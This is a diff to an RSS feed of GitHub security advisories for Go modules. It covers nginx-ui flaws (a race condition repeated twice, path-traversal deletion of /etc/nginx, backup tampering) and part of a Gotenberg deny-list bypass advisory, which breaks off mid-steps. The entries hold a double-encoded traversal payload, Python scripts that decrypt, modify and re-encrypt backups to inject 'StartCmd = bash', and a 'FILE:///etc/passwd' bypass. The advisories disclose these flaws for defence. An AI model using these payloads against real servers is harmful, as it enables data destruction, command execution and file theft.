@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-30T15:38:26.370Z</updated>
+    <updated>2026-03-30T16:36:21.120Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,587 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/uozi-tech/cosy] nginx-ui has Race Condition that Leads to Persistent Data Corruption and Service Collapse]]></title>
+        <id>https://github.com/advisories/GHSA-m468-xcm6-fxg4</id>
+        <link href="https://github.com/advisories/GHSA-m468-xcm6-fxg4"/>
+        <updated>2026-03-30T16:34:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>nginx-ui</code> application is vulnerable to a <strong>Race Condition</strong>. Due to the complete absence of synchronization mechanisms (Mutex) and non-atomic file writes, concurrent requests lead to the severe corruption of the primary configuration file (<code>app.ini</code>). This vulnerability results in a persistent Denial of Service (DoS) and introduces a non-deterministic path for <strong>Remote Code Execution (RCE)</strong> through configuration cross-contamination.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists because the settings update pipeline does not implement any synchronization primitives. When multiple requests reach the handler simultaneously:</p>
+<ol>
+<li><strong>Memory Corruption</strong>: <code>ProtectedFill()</code> modifies shared global singleton pointers without thread-safety, leading to inconsistent states in memory.</li>
+<li><strong>File Corruption</strong>: The underlying library (<code>gopkg.in/ini.v1</code>) performs direct overwrites. Concurrent write operations interleave at the OS level, resulting in <code>app.ini</code> files with empty leading lines, truncated fields, or partially overwritten configuration keys.</li>
+<li><strong>State Persistent Failure</strong>: Depending on which bytes are corrupted, the application either fails its "is-installed" check (redirecting to <code>/install</code>) or encounters a fatal error during boot/runtime that prevents the process from responding to any further requests.</li>
+</ol>
+<p><strong>Environment:</strong></p>
+<ul>
+<li><strong>OS</strong>: Kali Linux 6.17.10-1kali1 (6.17.10+kali-amd64)</li>
+<li><strong>Application Version</strong>: nginx-ui v2.3.3 (513) e5da6dd (go1.26.0)</li>
+<li><strong>Deployment</strong>: Docker Container</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ol start="0">
+<li><p>Check original app.ini file valid state:</p>
+<img src="https://github.com/user-attachments/assets/d9688f76-7fe7-46ea-9eb9-c55bf40918a6" alt="image" height="367" width="524">
+</li>
+<li><p>Log in to the <code>nginx-ui</code> dashboard.</p>
+</li>
+<li><p>Navigate to Preferences and update settings. Capture a <code>POST /api/settings</code> request and send it to <strong>Burp Suite Intruder</strong>.</p>
+</li>
+<li><p>Configure the attack with <strong>Null payloads</strong> (to test basic concurrency) or a <strong>Fuzzing list</strong> (to test data-driven corruption).</p>
+</li>
+<li><p>Set the <strong>Resource Pool</strong> to 20-50 concurrent requests.</p>
+<img src="https://github.com/user-attachments/assets/403eef43-2bc6-4651-8802-15ddcb4f7631" alt="image" height="776" width="1188">
+</li>
+<li><p><strong>Observation (In-flight corruption)</strong>: Monitor the <code>app.ini</code> file. You will observe the file being written with empty leading lines or incomplete key-value pairs.</p>
+</li>
+</ol>
+<ul>
+<li><img src="https://github.com/user-attachments/assets/d99553f7-d253-4525-9b45-f59994e69180" alt="image" height="390" width="1316"></li>
+</ul>
+<hr>
+<ul>
+<li><img src="https://github.com/user-attachments/assets/7522ba29-39f1-4c22-88f2-8e859cdb1984" alt="image" height="709" width="1368"></li>
+</ul>
+<ol start="6">
+<li><strong>Observation (Recovery Failure)</strong>: If the service redirects to <code>/install</code>, attempting to complete the setup again often fails because the underlying configuration state is too corrupted to be reconciled by the installer logic.</li>
+<li><strong>Observation (Total Service Collapse)</strong>: When the corruption in <code>app.ini</code> becomes so severe, the Go runtime or the INI parser encounters a fatal error, causing the Nginx-UI service to stop responding entirely (Hard DoS).</li>
+</ol>
+<img src="https://github.com/user-attachments/assets/da4b99dc-ddce-4b79-b0bb-2d634bdd3bf7" alt="image" height="542" width="1344">
+
+<ol start="8">
+<li><p><strong>Observation (Cross-Section Contamination)</strong>: During testing, it was observed that sometimes INI sections become interleaved. For example, fields belonging to the <code>[nginx]</code> section (like <code>ConfigDir</code> or <code>ReloadCmd</code>) were erroneously written under the <code>[webauthn]</code> section.</p>
+<p><strong>Example of corrupted output observed:</strong></p>
+</li>
+</ol>
+<pre><code>[webauthn]
+RPDisplayName  = 
+RPID           = 
+RPOrigins      = 
+gDirWhiteList  = 
+ConfigDir      = /etc/nginx
+ConfigPath     = 
+PIDPath        = /run/nginx.pid
+SbinPath       = 
+TestConfigCmd  = 
+ReloadCmd      = nginx -s reload
+RestartCmd     = nginx -s stop
+StubStatusPort = 51820
+ContainerName  = 
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a <strong>High</strong> security risk (CWE-362: Race Condition).</p>
+<ul>
+<li><strong>Integrity</strong>: Permanent corruption of application settings and system-level configuration.</li>
+<li><strong>Availability</strong>: High. The attack results in a persistent Denial of Service that cannot be recovered via the web UI.</li>
+<li><strong>Remote Code Execution (RCE)</strong> Risk: Since the application allows updating certain fields (like Node Name) and uses others as shell commands (like ReloadCmd or RestartCmd), the observed "cross-contamination" of INI values means an attacker could potentially force a user-controlled string into a command execution field. If ReloadCmd is overwritten with a malicious payload provided in another field, the next nginx reload will execute that payload. While highly impactful, this specific exploit path is non-deterministic and depends on the precise interleaving of thread execution, making targeted exploitation difficult.</li>
+</ul>
+<h3 id="recommended-mitigation">Recommended Mitigation</h3>
+<ol>
+<li><strong>Implement Mutex Locking</strong>: Wrap the <code>ProtectedFill</code> and <code>settings.Save()</code> calls in a <code>sync.Mutex</code> to serialize access to global settings.</li>
+<li><strong>Atomic File Writes</strong>: Implement a "write-then-rename" strategy. Write the new configuration to <code>app.ini.tmp</code> and use <code>os.Rename()</code> to replace the original file atomically, ensuring the configuration file is always in a valid state.</li>
+</ol>
+<p>A patched version of nginx-ui  is available at <a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m468-xcm6-fxg4">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m468-xcm6-fxg4</a></li>
+<li><a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-m468-xcm6-fxg4">https://github.com/advisories/GHSA-m468-xcm6-fxg4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m468-xcm6-fxg4</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-30T16:34:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] nginx-ui has Race Condition that Leads to Persistent Data Corruption and Service Collapse]]></title>
+        <id>https://github.com/advisories/GHSA-m468-xcm6-fxg4</id>
+        <link href="https://github.com/advisories/GHSA-m468-xcm6-fxg4"/>
+        <updated>2026-03-30T16:34:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>nginx-ui</code> application is vulnerable to a <strong>Race Condition</strong>. Due to the complete absence of synchronization mechanisms (Mutex) and non-atomic file writes, concurrent requests lead to the severe corruption of the primary configuration file (<code>app.ini</code>). This vulnerability results in a persistent Denial of Service (DoS) and introduces a non-deterministic path for <strong>Remote Code Execution (RCE)</strong> through configuration cross-contamination.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists because the settings update pipeline does not implement any synchronization primitives. When multiple requests reach the handler simultaneously:</p>
+<ol>
+<li><strong>Memory Corruption</strong>: <code>ProtectedFill()</code> modifies shared global singleton pointers without thread-safety, leading to inconsistent states in memory.</li>
+<li><strong>File Corruption</strong>: The underlying library (<code>gopkg.in/ini.v1</code>) performs direct overwrites. Concurrent write operations interleave at the OS level, resulting in <code>app.ini</code> files with empty leading lines, truncated fields, or partially overwritten configuration keys.</li>
+<li><strong>State Persistent Failure</strong>: Depending on which bytes are corrupted, the application either fails its "is-installed" check (redirecting to <code>/install</code>) or encounters a fatal error during boot/runtime that prevents the process from responding to any further requests.</li>
+</ol>
+<p><strong>Environment:</strong></p>
+<ul>
+<li><strong>OS</strong>: Kali Linux 6.17.10-1kali1 (6.17.10+kali-amd64)</li>
+<li><strong>Application Version</strong>: nginx-ui v2.3.3 (513) e5da6dd (go1.26.0)</li>
+<li><strong>Deployment</strong>: Docker Container</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ol start="0">
+<li><p>Check original app.ini file valid state:</p>
+<img src="https://github.com/user-attachments/assets/d9688f76-7fe7-46ea-9eb9-c55bf40918a6" alt="image" height="367" width="524">
+</li>
+<li><p>Log in to the <code>nginx-ui</code> dashboard.</p>
+</li>
+<li><p>Navigate to Preferences and update settings. Capture a <code>POST /api/settings</code> request and send it to <strong>Burp Suite Intruder</strong>.</p>
+</li>
+<li><p>Configure the attack with <strong>Null payloads</strong> (to test basic concurrency) or a <strong>Fuzzing list</strong> (to test data-driven corruption).</p>
+</li>
+<li><p>Set the <strong>Resource Pool</strong> to 20-50 concurrent requests.</p>
+<img src="https://github.com/user-attachments/assets/403eef43-2bc6-4651-8802-15ddcb4f7631" alt="image" height="776" width="1188">
+</li>
+<li><p><strong>Observation (In-flight corruption)</strong>: Monitor the <code>app.ini</code> file. You will observe the file being written with empty leading lines or incomplete key-value pairs.</p>
+</li>
+</ol>
+<ul>
+<li><img src="https://github.com/user-attachments/assets/d99553f7-d253-4525-9b45-f59994e69180" alt="image" height="390" width="1316"></li>
+</ul>
+<hr>
+<ul>
+<li><img src="https://github.com/user-attachments/assets/7522ba29-39f1-4c22-88f2-8e859cdb1984" alt="image" height="709" width="1368"></li>
+</ul>
+<ol start="6">
+<li><strong>Observation (Recovery Failure)</strong>: If the service redirects to <code>/install</code>, attempting to complete the setup again often fails because the underlying configuration state is too corrupted to be reconciled by the installer logic.</li>
+<li><strong>Observation (Total Service Collapse)</strong>: When the corruption in <code>app.ini</code> becomes so severe, the Go runtime or the INI parser encounters a fatal error, causing the Nginx-UI service to stop responding entirely (Hard DoS).</li>
+</ol>
+<img src="https://github.com/user-attachments/assets/da4b99dc-ddce-4b79-b0bb-2d634bdd3bf7" alt="image" height="542" width="1344">
+
+<ol start="8">
+<li><p><strong>Observation (Cross-Section Contamination)</strong>: During testing, it was observed that sometimes INI sections become interleaved. For example, fields belonging to the <code>[nginx]</code> section (like <code>ConfigDir</code> or <code>ReloadCmd</code>) were erroneously written under the <code>[webauthn]</code> section.</p>
+<p><strong>Example of corrupted output observed:</strong></p>
+</li>
+</ol>
+<pre><code>[webauthn]
+RPDisplayName  = 
+RPID           = 
+RPOrigins      = 
+gDirWhiteList  = 
+ConfigDir      = /etc/nginx
+ConfigPath     = 
+PIDPath        = /run/nginx.pid
+SbinPath       = 
+TestConfigCmd  = 
+ReloadCmd      = nginx -s reload
+RestartCmd     = nginx -s stop
+StubStatusPort = 51820
+ContainerName  = 
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a <strong>High</strong> security risk (CWE-362: Race Condition).</p>
+<ul>
+<li><strong>Integrity</strong>: Permanent corruption of application settings and system-level configuration.</li>
+<li><strong>Availability</strong>: High. The attack results in a persistent Denial of Service that cannot be recovered via the web UI.</li>
+<li><strong>Remote Code Execution (RCE)</strong> Risk: Since the application allows updating certain fields (like Node Name) and uses others as shell commands (like ReloadCmd or RestartCmd), the observed "cross-contamination" of INI values means an attacker could potentially force a user-controlled string into a command execution field. If ReloadCmd is overwritten with a malicious payload provided in another field, the next nginx reload will execute that payload. While highly impactful, this specific exploit path is non-deterministic and depends on the precise interleaving of thread execution, making targeted exploitation difficult.</li>
+</ul>
+<h3 id="recommended-mitigation">Recommended Mitigation</h3>
+<ol>
+<li><strong>Implement Mutex Locking</strong>: Wrap the <code>ProtectedFill</code> and <code>settings.Save()</code> calls in a <code>sync.Mutex</code> to serialize access to global settings.</li>
+<li><strong>Atomic File Writes</strong>: Implement a "write-then-rename" strategy. Write the new configuration to <code>app.ini.tmp</code> and use <code>os.Rename()</code> to replace the original file atomically, ensuring the configuration file is always in a valid state.</li>
+</ol>
+<p>A patched version of nginx-ui  is available at <a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m468-xcm6-fxg4">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m468-xcm6-fxg4</a></li>
+<li><a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-m468-xcm6-fxg4">https://github.com/advisories/GHSA-m468-xcm6-fxg4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m468-xcm6-fxg4</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-30T16:34:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx Configuration Directory Vulnerable to Recursive Deletion via Improper Path Validation]]></title>
+        <id>https://github.com/advisories/GHSA-m8p8-53vf-8357</id>
+        <link href="https://github.com/advisories/GHSA-m8p8-53vf-8357"/>
+        <updated>2026-03-30T16:33:04.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The nginx-ui configuration improperly handles URL-encoded traversal sequences. When specially crafted paths are supplied, the backend resolves them to the base Nginx configuration directory and executes the operation on the base directory (/etc/nginx). In particular, this allows an authenticated user to remove the entire <code>/etc/nginx</code> directory, resulting in a partial Denial of Service.</p>
+<h2 id="details">Details</h2>
+<p>The file deletion logic fails to correctly validate and normalize paths containing URL-encoded traversal sequences such as <code>..%252F</code>.</p>
+<p>When such input is processed, the internal path resolution logic attempts to clamp the path into the allowed configuration directory. Instead of rejecting the traversal attempt, the clamping mechanism resolves the path to the base Nginx configuration directory itself.</p>
+<p>Because the deletion handler invokes <code>os.RemoveAll</code>, which recursively removes directories, this results in the deletion of the entire <code>/etc/nginx</code> directory.</p>
+<p>This behavior creates a dangerous interaction between path normalization and deletion logic:</p>
+<ul>
+<li>Traversal sequences are not rejected.</li>
+<li>Double-encoding (<code>..%252F</code>) is used to bypass initial shallow filters.</li>
+<li>The clamping mechanism resolves malicious paths to the base configuration directory.</li>
+<li>The deletion handler recursively deletes the resolved path.</li>
+</ul>
+<p>As a result, an attacker can trigger deletion of the entire Nginx configuration directory instead of being blocked by path validation logic.</p>
+<h3 id="root-cause">Root Cause</h3>
+<p>The vulnerability results from a combination of design flaws:</p>
+<ul>
+<li><strong>Improper Path Canonicalization</strong>: URL-encoded traversal sequences are not properly rejected.</li>
+<li><strong>Unsafe Fallback Logic</strong>: The <code>GetConfPath</code> clamping mechanism returns the base configuration directory when traversal is detected instead of rejecting the request.</li>
+<li><strong>Unsafe Deletion Primitive</strong>: The deletion handler invokes <code>os.RemoveAll</code>, which recursively deletes directories without additional safeguards. (delete.go)</li>
+</ul>
+<pre><code>    // Delete the file or directory
+    err = os.RemoveAll(fullPath)
+    if err != nil {
+        cosy.ErrHandler(c, err)
+        return
+    }
+</code></pre>
+<p>This interaction causes the deletion operation to target the most sensitive directory when a traversal attempt occurs.</p>
+<h3 id="environment">Environment</h3>
+<ul>
+<li><strong>Server OS</strong>: Kali Linux 6.17.10-1kali1 (6.17.10+kali-amd64)</li>
+<li><strong>Nginx UI Version</strong>:  nginx-ui v2.3.3</li>
+<li><strong>Deployment</strong>: Docker / Default installation</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
+<ol>
+<li><p>Log into nginx-ui.</p>
+</li>
+<li><p>Go to Manage Configs and create a Folder named <em>..%252F..%252F..%252F..%252Ftest</em></p>
+<img src="https://github.com/user-attachments/assets/738d7d65-7e13-48fa-affc-d5509c43900f" alt="image" height="559" width="1608">
+</li>
+<li><p>Observe that the backend resolves the path to /etc/nginx.. </p>
+</li>
+<li><p>Now lets create a file called <em>testing</em>. </p>
+</li>
+<li><p>Save it and rename it to <em>..%252F..%252F..%252F..%252Ftest</em> (It is not possible to create it directly with the payload name so we have to rename it)</p>
+</li>
+<li><p>Go back to manage configs and Click Delete to remove the file we just created. </p>
+</li>
+<li><p>Check that there is an error: </p>
+<img src="https://github.com/user-attachments/assets/51a36310-0676-4fe5-b80c-e0199498efbf" alt="image" height="696" width="1578">
+</li>
+<li><p>Reload the website and check that the /etc/nginx folder has been completely removed: </p>
+<img src="https://github.com/user-attachments/assets/0a9ddd1b-786b-4cf2-8abd-1dc6f3a77807" alt="image" height="722" width="1313"></li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>An authenticated user capable of invoking the configuration deletion endpoint can trigger the recursive deletion of the entire Nginx configuration directory (<code>/etc/nginx</code>).</p>
+<p>This results in:</p>
+<ul>
+<li>Immediate failure of the Nginx service due to missing configuration files.</li>
+<li>Loss of all Nginx configuration managed by nginx-ui.</li>
+<li>Denial of Service for all web services relying on the affected Nginx instance.</li>
+</ul>
+<p>As the deletion operation uses a recursive filesystem call, the entire configuration directory is removed, leaving the system unable to restart Nginx until the configuration is manually restored.</p>
+<p>A patched version is available at <a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m8p8-53vf-8357">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m8p8-53vf-8357</a></li>
+<li><a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-m8p8-53vf-8357">https://github.com/advisories/GHSA-m8p8-53vf-8357</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m8p8-53vf-8357</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-30T16:33:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] nginx-ui Backup Restore Allows Tampering with Encrypted Backups]]></title>
+        <id>https://github.com/advisories/GHSA-fhh2-gg7w-gwpq</id>
+        <link href="https://github.com/advisories/GHSA-fhh2-gg7w-gwpq"/>
+        <updated>2026-03-30T16:23:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>nginx-ui</code> backup restore mechanism allows attackers to tamper with encrypted backup archives and inject malicious configuration during restoration.</p>
+<h2 id="details">Details</h2>
+<p>The backup format lacks a trusted integrity root. Although files are encrypted, the encryption key and IV are provided to the client and the integrity metadata (<code>hash_info.txt</code>) is encrypted using the same key. As a result, an attacker who can access the backup token can decrypt the archive, modify its contents, recompute integrity hashes, and re-encrypt the bundle.</p>
+<p>Because the restore process does not enforce integrity verification and accepts backups even when hash mismatches are detected, the system restores attacker-controlled configuration even when integrity verification warnings are raised. In certain configurations this may lead to arbitrary command execution on the host.</p>
+<p>The backup system is built around the following workflow:</p>
+<ol>
+<li>Backup files are compressed into <code>nginx-ui.zip</code> and <code>nginx.zip</code>.</li>
+<li>The files are encrypted using AES-256-CBC.</li>
+<li>SHA-256 hashes of the encrypted files are stored in <code>hash_info.txt</code>.</li>
+<li>The hash file is also encrypted with the same AES key and IV.</li>
+<li>The AES key and IV are provided to the client as a "backup security token".</li>
+</ol>
+<p>This architecture creates a circular trust model:</p>
+<ul>
+<li>The encryption key is available to the client.</li>
+<li>The integrity metadata is encrypted with that same key.</li>
+<li>The restore process trusts hashes contained within the backup itself.</li>
+</ul>
+<p>Because the attacker can decrypt and re-encrypt all files using the provided token, they can also recompute valid hashes for any modified content.</p>
+<h3 id="environment">Environment</h3>
+<ul>
+<li><strong>OS</strong>: Kali Linux 6.17.10-1kali1 (6.17.10+kali-amd64)</li>
+<li><strong>Application Version</strong>: nginx-ui v2.3.3 (513) e5da6dd (go1.26.0)</li>
+<li><strong>Deployment</strong>: Docker Container default installation</li>
+<li><strong>Relevant Source Files</strong>:<ul>
+<li><code>backup_crypto.go</code></li>
+<li><code>backup.go</code></li>
+<li><code>restore.go</code></li>
+<li><code>SystemRestoreContent.vue</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<ol>
+<li><p>Generate a backup and extract the security token (Key and IV) from the HTTP response headers or the <code>.key</code> file.</p>
+ <img src="https://github.com/user-attachments/assets/857a1b3f-ce66-4929-a165-2f28393df17f" alt="image" height="586" width="1483">
+</li>
+<li><p>Decrypt the <code>nginx-ui.zip</code> archive using the obtained token.</p>
+</li>
+</ol>
+<pre><code>import base64
+import os
+import sys
+import zipfile
+from io import BytesIO
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+def decrypt_aes_cbc(encrypted_data: bytes, key_b64: str, iv_b64: str) -&gt; bytes:
+    key = base64.b64decode(key_b64)
+    iv = base64.b64decode(iv_b64)
+    
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted = cipher.decrypt(encrypted_data)
+    return unpad(decrypted, AES.block_size)
+
+def process_local_backup(file_path, token, output_dir):
+    key_b64, iv_b64 = token.split(":")
+    os.makedirs(output_dir, exist_ok=True)
+    print(f"[*] File processing: {file_path}")
+    
+    with zipfile.ZipFile(file_path, 'r') as main_zip:
+        main_zip.extractall(output_dir)
+        
+    files_to_decrypt = ["hash_info.txt", "nginx-ui.zip", "nginx.zip"]
+    
+    for filename in files_to_decrypt:
+        path = os.path.join(output_dir, filename)
+        if os.path.exists(path):
+            with open(path, "rb") as f:
+                encrypted = f.read()
+            
+            decrypted = decrypt_aes_cbc(encrypted, key_b64, iv_b64)
+            
+            out_path = path + ".decrypted"
+            with open(out_path, "wb") as f:
+                f.write(decrypted)
+            print(f"[*] Successfully decrypted: {out_path}")
+
+# Manual config
+BACKUP_FILE = "backup-20260314-151959.zip" 
+TOKEN = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+OUTPUT = "decrypted"
+
+if __name__ == "__main__":
+    process_local_backup(BACKUP_FILE, TOKEN, OUTPUT)
+</code></pre>
+<ol start="3">
+<li>Modify the contained <code>app.ini</code> to inject malicious configuration (e.g., <code>StartCmd = bash</code>).</li>
+<li>Re-compress the files and calculate the new SHA-256 hash.</li>
+<li>Update <code>hash_info.txt</code> with the new, legitimate-looking hashes for the modified files.</li>
+<li>Encrypt the bundle again using the original Key and IV.</li>
+</ol>
+<pre><code>import base64
+import hashlib
+import os
+import zipfile
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+def encrypt_file(data, key_b64, iv_b64):
+    key = base64.b64decode(key_b64)
+    iv = base64.b64decode(iv_b64)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return cipher.encrypt(pad(data, AES.block_size))
+
+def build_rebuilt_backup(files, token, output_filename="backup_rebuild.zip"):
+    key_b64, iv_b64 = token.split(":")
+    
+    encrypted_blobs = {}
+    for fname in files:
+        with open(fname, "rb") as f:
+            data = f.read()
+        
+        blob = encrypt_file(data, key_b64, iv_b64)
+
+        target_name = fname.replace(".decrypted", "")
+        encrypted_blobs[target_name] = blob
+        print(f"[*] Cipher {target_name}: {len(blob)} bytes")
+
+    hash_content = ""
+    for name, blob in encrypted_blobs.items():
+        h = hashlib.sha256(blob).hexdigest()
+        hash_content += f"{name}: {h}\n"
+    
+    encrypted_hash_info = encrypt_file(hash_content.encode(), key_b64, iv_b64)
+    encrypted_blobs["hash_info.txt"] = encrypted_hash_info
+
+    with zipfile.ZipFile(output_filename, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
+        for name, blob in encrypted_blobs.items():
+            zf.writestr(name, blob)
+            
+    print(f"\n[*] Backup rebuild: {output_filename}")
+    print(f"[*] Verificando integridad...")
+
+TOKEN = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+FILES = ["nginx-ui.zip.decrypted", "nginx.zip.decrypted"]
+
+if __name__ == "__main__":
+    build_rebuilt_backup(FILES, TOKEN)
+</code></pre>
+<ol start="7">
+<li><p>Upload the tampered backup to the <code>nginx-ui</code> restore interface.</p>
+<img src="https://github.com/user-attachments/assets/66872685-b85b-4c81-ae24-13c811acba9a" alt="image" height="290" width="1059">
+
+</li>
+<li><p><strong>Observation</strong>: The system accepts the modified backup. Although a warning may appear, the restoration proceeds and the malicious configuration is applied, granting the attacker arbitrary command execution on the host.</p>
+<img src="https://github.com/user-attachments/assets/2752749e-ac39-4d60-88ca-5058b8e840a6" alt="image" height="627" width="1316"></li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>An attacker capable of uploading or supplying a malicious backup can modify application configuration and internal state during restoration.</p>
+<p>Potential impacts include:</p>
+<ul>
+<li>Persistent configuration tampering</li>
+<li>Backdoor insertion into nginx configuration</li>
+<li>Execution of attacker-controlled commands depending on configuration settings</li>
+<li>Full compromise of the nginx-ui instance</li>
+</ul>
+<p>The severity depends on the restore permissions and deployment configuration.</p>
+<h2 id="recommended-mitigation">Recommended Mitigation</h2>
+<ol>
+<li><p><strong>Introduce a trusted integrity root</strong>
+Integrity metadata must not be derived solely from data contained in the backup. Possible solutions include:</p>
+<ul>
+<li>Signing backup metadata using a server-side private key</li>
+<li>Storing integrity metadata separately from the backup archive</li>
+</ul>
+</li>
+<li><p><strong>Enforce integrity verification</strong>
+The restore operation must abort if hash verification fails.</p>
+</li>
+<li><p><strong>Avoid circular trust models</strong>
+If encryption keys are distributed to clients, the backup must not rely on attacker-controlled metadata for integrity validation.</p>
+</li>
+<li><p><strong>Optional cryptographic improvements</strong>
+While not sufficient alone, switching to an authenticated encryption scheme such as AES-GCM can simplify integrity protection if the encryption keys remain secret.</p>
+</li>
+</ol>
+<p>This vulnerability arises from a circular trust model where integrity metadata is protected using the same key that is provided to the client, allowing attackers to recompute valid integrity data after modifying the archive.</p>
+<h2 id="regression">Regression</h2>
+<p>The previously reported vulnerability (GHSA-g9w5-qffc-6762) addressed unauthorized access to backup files but did not resolve the underlying cryptographic design issue.</p>
+<p>The backup format still allows attacker-controlled modification of encrypted backup contents because integrity metadata is protected using the same key distributed to clients.</p>
+<p>As a result, the fundamental integrity weakness remains exploitable even after the previous fix.</p>
+<p>A patched version is available at <a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-fhh2-gg7w-gwpq">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-fhh2-gg7w-gwpq</a></li>
+<li><a href="https://github.com/advisories/GHSA-g9w5-qffc-6762">https://github.com/advisories/GHSA-g9w5-qffc-6762</a></li>
+<li><a href="https://github.com/advisories/GHSA-fhh2-gg7w-gwpq">https://github.com/advisories/GHSA-fhh2-gg7w-gwpq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fhh2-gg7w-gwpq</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-30T16:23:34.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gotenberg/gotenberg/v8] Gotenberg has Chromium deny-list bypass via case-insensitive URL scheme (bypass of GHSA-rh2x-ccvw-q7r3)]]></title>
+        <id>https://github.com/advisories/GHSA-jjwv-57xh-xr6r</id>
+        <link href="https://github.com/advisories/GHSA-jjwv-57xh-xr6r"/>
+        <updated>2026-03-30T16:16:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The fix introduced in version 8.1.0 for GHSA-rh2x-ccvw-q7r3 (CVE-2024-21527) can be bypassed using mixed-case or uppercase URL schemes.</p>
+<p>The default <code>--chromium-deny-list</code> value is <code>^file:(?!//\/tmp/).*</code>. This regex is anchored to lowercase <code>file:</code> at the start. However, per RFC 3986 Section 3.1, URI schemes are case-insensitive. Chromium normalizes the scheme to lowercase before navigation, so a URL like <code>FILE:///etc/passwd</code> or <code>File:///etc/passwd</code> bypasses the deny-list check but still gets resolved by Chromium as <code>file:///etc/passwd</code>.</p>
+<p>The root cause is in <code>pkg/gotenberg/filter.go</code> — the <code>FilterDeadline</code> function compiles the deny-list regex with <code>regexp2.MustCompile(denied.String(), 0)</code>, where <code>0</code> means no flags (case-sensitive). Since the regex pattern itself doesn't include a <code>(?i)</code> flag, matching is strictly case-sensitive.</p>
+<p>This affects both the URL endpoint and HTML conversion (via iframes, link tags, etc.).</p>
+<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
+<ol>
+<li>Start Gotenberg with default settings:</li>
+</ol>
